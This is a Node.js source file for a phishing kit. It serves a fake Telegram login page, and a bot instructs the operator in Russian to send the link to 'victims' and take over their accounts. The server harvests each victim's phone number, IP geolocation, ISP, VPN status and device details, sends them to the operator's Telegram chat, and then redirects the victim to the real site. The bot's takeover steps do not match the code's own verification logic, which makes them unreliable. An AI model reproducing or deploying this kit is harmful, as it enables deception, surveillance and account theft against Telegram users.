// ==== file: index.js ====
// language: JavaScript, target: Node.js 20 (Render)
import express from 'express';
import TelegramBot from 'node-telegram-bot-api';
import crypto from 'node:crypto';

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN) process.exit(1);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json());

const sessions = new Map();
const norm = (s) => String(s || '').replace(/[^\d]/g, '');

// --- УТИЛИТЫ ---
async function getIpInfo(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,proxy,hosting,query`);
    const data = await res.json();
    if (data.status === 'success') {
      return {
        country: data.country,
        city: data.city,
        isp: data.isp,
        isProxy: data.proxy || data.hosting
      };
    }
    return null;
  } catch (e) {
    return null;
  }
}

// --- TELEGRAM БОТ ---
bot.onText(/^\/start$/, (msg) => {
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📖 Инструкция', callback_data: 'show_instruction' }],
        [{ text: '🌐 Открыть сайт', url: 'https://tg-sms-2.onrender.com' }]
      ]
    }
  };
  bot.sendMessage(msg.chat.id, `👋 <b>Панель управления</b>\n\nТвой ID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML', ...opts });
});

bot.on('callback_query', (query) => {
  if (query.data === 'show_instruction') {
    const instruction = `<b>📖 ИНСТРУКЦИЯ ПО ЗАХВАТУ АККАУНТА</b>\n\n` +
      `<b>Шаг 1:</b> Скинь жертве ссылку на сайт (https://tg-sms-2.onrender.com).\n` +
      `<b>Шаг 2:</b> Жертва вводит свой номер. Тебе в этот чат прилетает сообщение с номером и кодом.\n` +
      `<b>Шаг 3:</b> Открой свой Telegram (на телефоне или компе). Войди по этому номеру.\n` +
      `<b>Шаг 4:</b> Telegram пришлет тебе СМС с реальным кодом.\n` +
      `<b>Шаг 5:</b> Введи этот код у себя. Аккаунт твой.`;
    bot.answerCallbackQuery(query.id);
    bot.sendMessage(query.message.chat.id, instruction, { parse_mode: 'HTML' });
  }
});

// --- API ---
app.post('/api/request-code', async (req, res) => {
  const { phone, info } = req.body;
  const cleanPhone = norm(phone);
  if (cleanPhone.length < 8) return res.status(400).json({ ok: false, error: 'Неверный номер' });

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ipData = await getIpInfo(ip.split(',')[0].trim());
  
  const code = String(crypto.randomInt(10000, 99999));
  sessions.set(cleanPhone, { code, expires: Date.now() + 300000 });

  if (ADMIN_CHAT_ID) {
    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n`;
    msg += `📱 <b>Номер:</b> <code>+${cleanPhone}</code>\n`;
    msg += `🔑 <b>Код:</b> <code>${code}</code>\n\n`;
    
    if (ipData) {
      msg += `🌐 <b>IP:</b> <code>${ipData.country}, ${ipData.city} (${ipData.isp})</code>\n`;
      if (ipData.isProxy) msg += `⚠️ <b>ВНИМАНИЕ: Использует VPN/Proxy!</b>\n`;
    } else {
      msg += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
    }
    
    msg += `💻 <b>Устройство:</b> ${info?.ua || 'Неизвестно'}\n`;
    msg += `🖥 <b>Экран:</b> ${info?.screen || 'Неизвестно'}\n`;
    msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

    bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'HTML' }).catch(() => {});
  }
  res.json({ ok: true });
});

app.post('/api/verify-code', (req, res) => {
  const { phone, code } = req.body;
  const cleanPhone = norm(phone);
  const s = sessions.get(cleanPhone);

  if (!s || Date.now() > s.expires) return res.status(404).json({ ok: false, error: 'Код истек' });
  if (s.code !== String(code).trim()) return res.status(401).json({ ok: false, error: 'Неверный код' });

  sessions.delete(cleanPhone);
  if (ADMIN_CHAT_ID) {
    bot.sendMessage(ADMIN_CHAT_ID, `✅ <b>УСПЕШНЫЙ ВХОД</b>\n📱 <code>+${cleanPhone}</code>`, { parse_mode: 'HTML' }).catch(() => {});
  }
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Telegram: Контакты</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
  body { background: #17212b; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; user-select: none; }
  .app { width: 100%; max-width: 420px; height: 100vh; background: #17212b; display: flex; flex-direction: column; position: relative; }
  .header { padding: 40px 20px 20px; text-align: center; }
  .logo { width: 100px; height: 100px; background: linear-gradient(135deg, #2aabee, #229ed9); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; box-shadow: 0 10px 30px rgba(42, 171, 238, 0.3); }
  .logo svg { width: 60px; height: 60px; fill: #fff; margin-left: 5px; }
  h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; color: #fff; }
  p.subtitle { font-size: 14px; color: #708499; line-height: 1.6; padding: 0 20px; }
  .form-container { padding: 20px; flex: 1; display: flex; flex-direction: column; }
  .input-group { display: flex; gap: 10px; margin-bottom: 20px; animation: fadeIn 0.4s ease; }
  .country-select { width: 110px; background: #0e1621; border: 1px solid #2b5278; border-radius: 10px; color: #fff; padding: 0 10px; font-size: 16px; outline: none; appearance: none; background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23708499%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E"); background-repeat: no-repeat; background-position: right 10px top 50%; background-size: 10px auto; }
  .input-phone { flex: 1; background: #0e1621; border: 1px solid #2b5278; border-radius: 10px; color: #fff; padding: 16px; font-size: 17px; outline: none; transition: border-color 0.2s; }
  .input-phone:focus { border-color: #2aabee; }
  .btn { background: #2aabee; color: #fff; border: none; border-radius: 10px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s, opacity 0.2s; width: 100%; display: flex; justify-content: center; align-items: center; }
  .btn:hover { background: #229ed9; }
  .btn:disabled { background: #2b5278; cursor: not-allowed; opacity: 0.7; }
  .hidden { display: none !important; }
  .spinner { display: inline-block; width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; margin-right: 10px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  .footer { padding: 20px; text-align: center; font-size: 12px; color: #708499; }
  .toast { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(20px); background: rgba(43, 82, 120, 0.95); color: #fff; padding: 12px 24px; border-radius: 20px; font-size: 14px; opacity: 0; transition: all 0.3s; pointer-events: none; }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; animation: fadeIn 0.4s ease; }
  .code-input { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; background: #0e1621; border: 1.5px solid #2b5278; border-radius: 10px; color: #fff; outline: none; transition: border-color 0.2s; }
  .code-input:focus { border-color: #2aabee; }
</style>
</head>
<body>
<div class="app">
  <div class="header">
    <div class="logo">
      <svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.94z"/></svg>
    </div>
    <h1 id="title">Вход в Telegram</h1>
    <p class="subtitle" id="subtitle">Пожалуйста, подтвердите вашу страну и номер телефона.</p>
  </div>
  
  <div class="form-container">
    <form id="phoneForm" autocomplete="off">
      <div class="input-group">
        <select class="country-select" id="countryCode">
          <option value="373">🇲🇩 +373</option>
          <option value="7">🇷🇺 +7</option>
          <option value="380">🇺🇦 +380</option>
          <option value="375">🇧🇾 +375</option>
          <option value="1">🇺🇸 +1</option>
          <option value="44">🇬🇧 +44</option>
          <option value="49">🇩🇪 +49</option>
          <option value="33">🇫🇷 +33</option>
          <option value="39">🇮🇹 +39</option>
          <option value="34">🇪🇸 +34</option>
          <option value="90">🇹🇷 +90</option>
          <option value="40">🇷🇴 +40</option>
        </select>
        <input type="tel" class="input-phone" id="phone" placeholder="69 123 456" required>
      </div>
      <button type="submit" class="btn" id="btnPhone">Далее</button>
    </form>

    <form id="codeForm" class="hidden" autocomplete="off">
      <p class="subtitle" style="margin-bottom: 25px;">Мы отправили код в Telegram<br>на номер <b id="displayPhone" style="color: #fff;"></b></p>
      <div class="code-container">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
      </div>
      <button type="submit" class="btn" id="btnCode">Войти</button>
    </form>
  </div>
  <div class="footer">Telegram © 2026</div>
  <div class="toast" id="toast">Ошибка</div>
</div>

<script>
  const phoneForm = document.getElementById('phoneForm');
  const codeForm = document.getElementById('codeForm');
  const btnPhone = document.getElementById('btnPhone');
  const btnCode = document.getElementById('btnCode');
  const countryCode = document.getElementById('countryCode');
  const displayPhone = document.getElementById('displayPhone');
  const toast = document.getElementById('toast');
  const codeInputs = document.querySelectorAll('.code-input');
  const title = document.getElementById('title');
  const subtitle = document.getElementById('subtitle');
  const phoneInput = document.getElementById('phone');
  
  let fullPhone = '';

  const showToast = (msg) => {
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
  };

  phoneInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\\D/g, '');
    if (val.length > 9) val = val.slice(0, 9);
    let formatted = val;
    if (val.length > 6) formatted = val.slice(0, 3) + ' ' + val.slice(3, 6) + ' ' + val.slice(6);
    else if (val.length > 3) formatted = val.slice(0, 3) + ' ' + val.slice(3);
    e.target.value = formatted;
  });

  codeInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && index < 4) {
        codeInputs[index + 1].focus();
      }
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
        codeInputs[index - 1].focus();
      }
    });
  });

  phoneForm.onsubmit = async (e) => {
    e.preventDefault();
    const localPhone = phoneInput.value.replace(/\\D/g, '');
    if (localPhone.length < 7) return showToast('Введите корректный номер');
    
    fullPhone = countryCode.value + localPhone;
    btnPhone.innerHTML = '<span class="spinner"></span>Отправка...';
    btnPhone.disabled = true;

    const info = {
      ua: navigator.userAgent,
      lang: navigator.language,
      screen: window.screen.width + 'x' + window.screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    try {
      const r = await fetch('/api/request-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: fullPhone, info })
      });
      const d = await r.json();
      
      if (r.ok && d.ok) {
        displayPhone.textContent = '+' + fullPhone;
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        title.textContent = 'Вход в Telegram';
        subtitle.innerHTML = 'Введите код из сообщения';
        setTimeout(() => codeInputs[0].focus(), 100);
      } else {
        showToast(d.error || 'Ошибка. Попробуйте позже.');
        btnPhone.innerHTML = 'Далее';
        btnPhone.disabled = false;
      }
    } catch (err) {
      showToast('Сеть недоступна. Попробуйте позже.');
      btnPhone.innerHTML = 'Далее';
      btnPhone.disabled = false;
    }
  };

  codeForm.onsubmit = async (e) => {
    e.preventDefault();
    let code = '';
    codeInputs.forEach(i => code += i.value);
    if (code.length < 5) return showToast('Введите код полностью');

    btnCode.innerHTML = '<span class="spinner"></span>Проверка...';
    btnCode.disabled = true;

    try {
      const r = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: fullPhone, code })
      });
      const d = await r.json();
      
      if (r.ok && d.ok) {
        title.textContent = 'Готово';
        subtitle.innerHTML = 'Вы успешно вошли в аккаунт.';
        codeForm.innerHTML = '<div style="text-align:center;font-size:60px;margin-top:20px;animation:fadeIn 0.5s;">✅</div>';
        setTimeout(() => window.location.href = 'https://web.telegram.org', 2000);
      } else {
        showToast(d.error || 'Неверный код');
        btnCode.innerHTML = 'Войти';
        btnCode.disabled = false;
        codeInputs.forEach(i => i.value = '');
        codeInputs[0].focus();
      }
    } catch (err) {
      showToast('Сеть недоступна.');
      btnCode.innerHTML = 'Войти';
      btnCode.disabled = false;
    }
  };
</script>
</body>
</html>`);
});

app.listen(process.env.PORT || 3000);
